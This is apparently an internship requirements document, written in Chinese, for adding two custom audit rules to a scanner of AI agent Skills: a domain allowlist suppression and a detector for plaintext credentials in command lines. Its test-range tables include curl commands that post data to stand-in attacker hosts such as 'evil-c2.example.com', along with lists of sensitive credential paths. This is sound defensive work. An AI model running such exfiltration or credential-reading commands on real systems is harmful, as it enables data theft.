# 自定义安全检测扩展需求文档

> 功能名称：自定义安全检测扩展（任务 A）
> 所属课题：AI Agent 技能（Agent Skills）全链路安全审计与效果评估系统
> 依据：`docs/杨宇涵 实习课题.md` 阶段三「任务 A」要求
> 状态：开发依据稿（v1.0，2026-11-18）

---

## 1. 背景与目标

### 1.1 课题原文要求

> 任务 A（自定义安全检测扩展）：深入研究安全扫描器与评估框架的规则机制，新增至少 **2 条**企业自定义安全审计规则（例如：禁止 Skill 指令中出现向非白名单域名发送 `curl/wget` 请求、禁止读取 `~/.ssh` 或 `.env` 等敏感路径），并在靶场 Skill 上验证拦截效果。

> **实现注**：课题括号内为举例。实测基线（见 §1.3）表明「读取敏感文件」已被内置 PE3 覆盖、「外发检测」已由内置 E1 承担，故最终落地方案调整为 **规则 A = 域名白名单放行（抑制层降误报，不新增告警）+ 规则 B = 禁止明文凭证内嵌命令行/连接串（YARA 检测）**——仍满足「新增 ≥2 条企业自定义安全扩展」的课题要求。

### 1.2 目标

在 **SkillSpector 安全扫描器**（规则引擎，而非框架流水线）上新增 ≥2 项企业自定义安全审计扩展（1 条检测规则 + 1 项抑制层放行）：

1. **规则 A**：域名白名单放行（抑制层降误报，不新增告警）；
2. **规则 B**：禁止明文凭证内嵌命令行 / 连接串。

### 1.3 关键结论（实测基线，决定规则定位）

对靶场 Skill `skill-dataset/security/custom-rules-range/` 的完整 Tier1（SkillSpector 含 LLM 语义分析）实测得出：

| 结论 | 说明 |
|---|---|
| 外发检测不新增规则 | E1 只拦「带数据上传」的 curl/wget（`-d`/`--data`/`--post-data`），纯 GET 外发漏报；域名白名单维度统一收敛到抑制层 `allow_domain`（规则 A），不新增 YARA 检测规则 |
| 规则 B 原题「读敏感文件」已饱和 | PE3「Credential File Access」已覆盖 `~/.ssh/*`、`.env`、`.netrc`、`.docker/config.json`、`.kube/config`、浏览器 Cookie 库、keychain、`/etc/shadow` 等（见 `static_patterns_privilege_escalation.py:125-149`） |
| 规则 B 真实空白在「命令行凭证」 | `chpasswd` / `curl -u user:pass` / `mysql -p<字面量>` / `psql://user:pass@` / `redis-cli -a` / URL userinfo 全部 **0 检出**（全仓 grep 零命中） |
| LLM 无法替代确定性规则 | LLM 仅给出「描述-行为不符（TP4）」「外发 SSH 私钥（SSD-3）」「调用脚本（SSD-1）」等间接信号，**没有一条定位到具体明文凭证命令**，且无 file:line 级评级 |

## 2. 功能范围与非目标（功能边界总览）

### 2.1 范围内

- 规则 A：对「发往白名单域名」的外发 finding 做抑制放行（`allow_domain`），不新增告警；
- 规则 B：对 **字面量凭证 token** 内嵌命令行/连接串做检测，并豁免占位符形态；
- 规则落点为 SkillSpector 的 suppression 扩展 + YARA 规则，非侵入式挂载。

### 2.2 非目标（本期不做，明确边界）

| 非目标 | 原因 |
|---|---|
| 变量 / 动态拼接的 URL 与凭证 | 静态分析看不到运行时的值，需常量传播（另立，本期范围外） |
| 运行时动态拼密码（Agent 把真实密码填进命令行） | 属运行行为，静态规则抓不到，靠规范约束/动态检测 |
| ftp 等其它明文协议外发 | 当前无 ftp 外发检测规则，需先补 YARA 检测才有对象可放行 |
| 任意正则的域名匹配 | 白名单仅支持精确 host + `*.` 子域名通配，避免误放行 |

## 3. 术语与定义

| 术语 | 定义 |
|---|---|
| finding | SkillSpector 扫描产出的一条风险发现（含 rule_id / severity / confidence / file / start_line） |
| 白名单域名 | 企业信任的可信域名集合（内置默认 + 可配置），发往该域名的外发不算风险 |
| 字面量 URL / 字面量凭证 | 直接写在文件文本里的 URL / 密码，静态扫描可见 |
| 占位符形态 | `<password>`、`${password}`、`$VAR`、`...`、`***`、`xxx`、`YOUR_PASSWORD` 等显式占位写法 |
| 抑制层 | SkillSpector 的 `Baseline`/`partition_findings` 机制，在评分与去重前拦截 finding |
| 正样本 / 负样本 | 靶场中「应被检测为漏洞」/「不应被检测」的植入内容 |

## 4. 总体方案

### 4.1 落点（三处）

| 组件 | 改动 | 说明 |
|---|---|---|
| SkillSpector YARA 规则 | 新增 `cvte_credential_inline.yar`（规则 B，检测明文凭证） | 经 `--yara-rules-dir` 非侵入挂载 |
| SkillSpector suppression | 扩展 `SuppressionRule` 增加 `allow_domain`（`methods` 留空 = 全量），即**规则 A 白名单放行** | 白名单放行统一收敛于此，对内置 E1 等所有外发 finding 一律生效 |
| 靶场 Skill | `skill-dataset/security/custom-rules-range/` | 正/负样本，验证拦截与放行 |

### 4.2 运行方式

```bash
# 挂载自定义规则 + 抑制基线，扫描单个 skill
docker compose run --rm skillspector scan /scan/security/custom-rules-range \
  --yara-rules-dir /scan/../custom-rules --baseline /scan/../baseline.yaml --format json
```

### 4.3 规则开关（灰度控制）

**目标**：运行完整 Tier1 前，用户可自由勾选启用 / 停用规则 A 与规则 B（两个**独立开关**），用于对比「启用 vs 不启用」时安全审查结果的差异。

**设计约束**：

- 规则 A（白名单放行）经 `--baseline baseline.yaml` 挂载，规则 B（凭证检测）经 `--yara-rules-dir` 挂 `cvte_credential_inline.yar`，两者互不耦合；
- 开关**不侵入 SkillSpector 源码**（保持非侵入式挂载）；
- 规则 B 通过「开关配置 + 运行前组装 staging 目录」实现：选中时复制 `.yar` 到临时目录再挂载，未选中不挂载；规则 A 由 `select.yaml` 的 `rule_a` 决定是否追加 `--baseline`。

**开关配置（数据契约）**：

```yaml
# custom-rules/select.yaml
rules:
  rule_a: true    # 规则 A：域名白名单放行（抑制层 allow_domain，追加 --baseline）
  rule_b: true    # 规则 B：禁止明文凭证内嵌命令行/连接串
```

**四种组合与对比口径**：

| 组合 | 挂载内容 | 用途 |
|---|---|---|
| 基线（都不启用） | 空 staging 目录、无 `--baseline` | 当前扫描器原生结果（对照） |
| 仅规则 A | 追加 `--baseline baseline.yaml` | 规则 A（白名单放行）的放行效果 |
| 仅规则 B | `cvte_credential_inline.yar` | 规则 B 的增量贡献 |
| A + B | `baseline.yaml` + `cvte_credential_inline.yar` | 扩展后的最终结果 |

**对比方法**：规则 B 以「新增 findings（rule_id = 规则 B 的 id）」为增量口径；规则 A 以「外发 finding 从 kept 移到 suppressed 的数量」为放行口径，比较 4 组 run 的 findings 数、风险评分、高危项变化；并验证两规则正交（互不干扰）。

## 5. 规则 A：域名白名单放行（抑制层）

### 5.1 定位

与规则 B（新增告警规则）正交的「放行 / 降误报」扩展：数据发往用户信任的域名时不再作为风险 finding，避免误报。**规则 A 本身不新增任何 finding**——外发检测完全依赖扫描器内置规则（如 E1 http 外发），规则 A 只在抑制层把「发往白名单域名」的外发 finding 从 kept 移到 suppressed（降误报）。

### 5.2 现状

SkillSpector 已有 `Baseline` / `partition_findings`（`suppression.py`）抑制机制，在评分与去重之前拦截；但 `SuppressionRule` 仅支持 `id` / `path` / `message` 三个 glob 维度，**无「域名」维度**，故需扩展。

### 5.3 实现要点

- 扩展 `SuppressionRule` 增加 `allow_domain`（可选 `methods` 二维白名单，`methods` 留空 = 对所有 rule_id 生效）；
- 从 `finding.file` + `start_line` 经 `file_cache` 取原文行，正则提取目标 host（去协议/端口、小写归一化）；
- 精确 host 匹配 + `*.` 子域名通配（不支持任意正则）；
- 复用 `reason` 必填 + `suppressed` 审计留痕；
- `methods` 维度复用 rule_id/sink 分类（E1=http、E5=cloud-storage、socket=TT sink），零新增文本提取；
- **职责收敛**：规则 A 不内嵌域名判断，白名单放行统一由本层承担，对内置 E1 等所有外发 finding 一律生效——「检测归检测、放行归放行」。

### 5.4 功能边界

- **仅字面量 URL**；变量 / 动态 URL 需常量传播（范围外）；
- **ftp 外发**当前无检测规则，需先补 YARA 检测才有对象可放行；
- 白名单放行只作用于「域名」维度，不改动 finding 的 severity/confidence 语义。

## 6. 规则 B：禁止明文凭证内嵌命令行/连接串

### 6.1 检测逻辑（决策表）

| 内容 | 判定 | 说明 |
|---|---|---|
| `mysql ... -pSecret123` | 🔴 报漏洞 | `-p` 后紧跟字面量 token |
| `curl -u admin:SecretPass123` | 🔴 报漏洞 | `user:pass` 字面量 |
| `echo 'root:P@ss' \| chpasswd` | 🔴 报漏洞 | 明文密码经管道进 passwd |
| `psql "postgres://admin:pass@db.internal"` | 🔴 报漏洞 | 连接串 URL userinfo |
| `redis-cli -a RedisSecret` | 🔴 报漏洞 | `-a` 后明文 |
| `mysql ... -p<password>` | 🟢 放行 | 显式占位符 |
| `curl -u admin:${password}` | 🟢 放行 | 环境变量引用 |
| `mysql -uroot -p` | 🟢 放行 | `-p` 无值 = 交互输入（安全） |
| `curl -u admin` | 🟢 放行 | 只有用户名，无 `:pass` |

### 6.2 匹配模式（凭证载体）

```
chpasswd / passwd   ← echo '<user>:<pw>' | ...
curl -u user:pass   ← 带冒号，不带冒号不放行
mysql --password= / -p<字面量>   ← -p 后紧跟非占位符 token
psql "postgres://user:pass@..."  ← URL userinfo
redis-cli -a <字面量> / mongosh --password ...
://user:pass@       ← 通用 URL userinfo
```

### 6.3 豁免（占位符）清单

`<...>`、`${...}`、`$VAR`、`"$VAR"`、`...`、`***`、`xxx`、`YOUR_*`、空值（`-p` / `-a` 无值）。

### 6.4 功能边界

- **仅字面量凭证**：文件里写死的 `-pSecret123` 可检测；运行时 Agent 把真实密码拼进命令行（`-p<实际值>`）不可检测，属运行行为。
- **危险等级 HIGH**：凭证泄露可致横向移动 / 未授权访问，应评 HIGH（非 MEDIUM）。
- **与 PE3 严格正交**：PE3 盯「读取凭证**文件路径**」，规则 B 盯「凭证出现在**进程参数/命令行**」，两者不重叠。
- **占位符清单需维护**：新占位符写法（如 `REPLACE_ME`、`<REDACTED>`）应持续补充豁免。

## 7. 靶场 Skill 与实测基线

### 7.1 位置与结构

`skill-dataset/security/custom-rules-range/`（SKILL.md + exfil_helper.py）

### 7.2 规则 B 正样本（应命中 HIGH）

| 内容 | 位置 |
|---|---|
| `echo 'root:P@ssw0rd!' \| chpasswd` | SKILL.md:43 |
| `curl -u admin:SecretPass123 https://...` | SKILL.md:49 |
| `mysql -h 10.0.0.5 -uroot -pSecret123 -e "..."` | SKILL.md:57 |
| `psql "postgres://admin:Passw0rd@db.internal:5432/appdb"` | SKILL.md:58 |
| `redis-cli -h cache.internal -a RedisSecret PING` | SKILL.md:59 |
| `requests.get("https://admin:secret@api.internal.example.com/data")` | exfil_helper.py |
| `conn_str = "postgres://admin:Passw0rd@db.internal:5432/appdb"` | exfil_helper.py |

### 7.3 规则 B 负样本（占位符 / 环境变量，不应命中）

| 内容 | 位置 |
|---|---|
| `mysql -h 10.0.0.5 -uroot -p<password> -e "..."` | SKILL.md:67 |
| `curl -u admin:${password} https://...` | SKILL.md:68 |
| `mysql -uroot -p`（无值） | SKILL.md:69 |
| `os.environ["DB_USER"] / ["DB_PASS"]` 环境变量取凭证 | exfil_helper.py |

### 7.4 规则 A 白名单放行样本（外发 → 抑制层放行 / 告警对照）

| 样本 | 目标域名 | 预期 |
|---|---|---|
| `curl -d '{"x":1}' https://cvte.com/upload` | `cvte.com`（白名单内） | 进 `suppressed` 不计分（放行） |
| `curl -d '{"x":1}' https://evil-c2.example.com/upload` | `evil-c2.example.com`（非白名单） | 保持告警（不放行） |
| `curl -d '{"x":1}' https://cvte.com.evil.com/upload` | 后缀 `evil.com`（陷阱） | 保持告警（`*.` 只匹配子域名） |

### 7.5 实测基线（实现规则前）

| 模式 | 风险评分 | findings | 规则 B 正样本检出 |
|---|---|---|---|
| 静态 `--no-llm` | 39 MEDIUM | 8 | 0 / 7 |
| 完整 Tier1（含 LLM） | 100 CRITICAL | 18 | 0 / 7（LLM 仅间接信号） |

> 结论：实现前规则 B 维度 **0 检出、危险等级缺失**（应为 HIGH）；外发检测由内置 E1 承担（纯 GET 漏报），白名单放行（规则 A）需在抑制层落地 `allow_domain` 才能降误报。

## 8. 验收标准

### 8.1 规则 A（域名白名单放行）

- [ ] 发往白名单域名的外发进入 `suppressed`（含 `reason` 审计留痕），不计分；
- [ ] 发往非白名单域名仍正常告警；
- [ ] `*.` 子域名通配正确（`a.cvte.com` 放行、`cvte.com.evil.com` 不放行）；
- [ ] 变量 URL（`curl $URL`）→ 不误报（明确范围外）。

### 8.2 规则 B（明文凭证检测）

- [ ] 字面量凭证正样本（`-pSecret123` / `curl -u user:pass` / `chpasswd` / 连接串 / URL userinfo）→ 全部命中 HIGH；
- [ ] 占位符负样本（`<password>` / `${password}` / `-p` 无值 / `-u user`）→ 全部不命中；
- [ ] 运行时动态拼密码 → 明确标注范围外，不误报也不漏报承诺。

### 8.3 规则开关（灰度控制）

- [ ] 4 种组合（无 / 仅 A / 仅 B / A+B）均可独立运行并得到结果；
- [ ] 仅启用 B 时只新增规则 B 的 findings；仅启用 A 时只影响白名单放行、**不新增 findings**；
- [ ] A+B 的 findings 增量 = 仅 B（规则 A 不新增 findings，两规则正交无干扰）；
- [ ] 开关配置可读、可解释，答辩时可现场演示「勾选 → 重跑 → 差异对比」。

## 9. 风险与依赖

| 风险/依赖 | 影响 | 缓解 |
|---|---|---|
| fail-closed 带来误报 | 字面量无法区分真伪 | 白名单抑制层 + 占位符豁免兜底 |
| 占位符清单不完整 | 漏放行/误报 | 维护豁免清单，测试补充 |
| 变量/动态 URL 无法静态覆盖 | 漏报 | 明确边界，常量传播另立 |
| 白名单域名来源不清 | 规则失效 | 内置默认 + 可配置，未配置时 fail-closed |
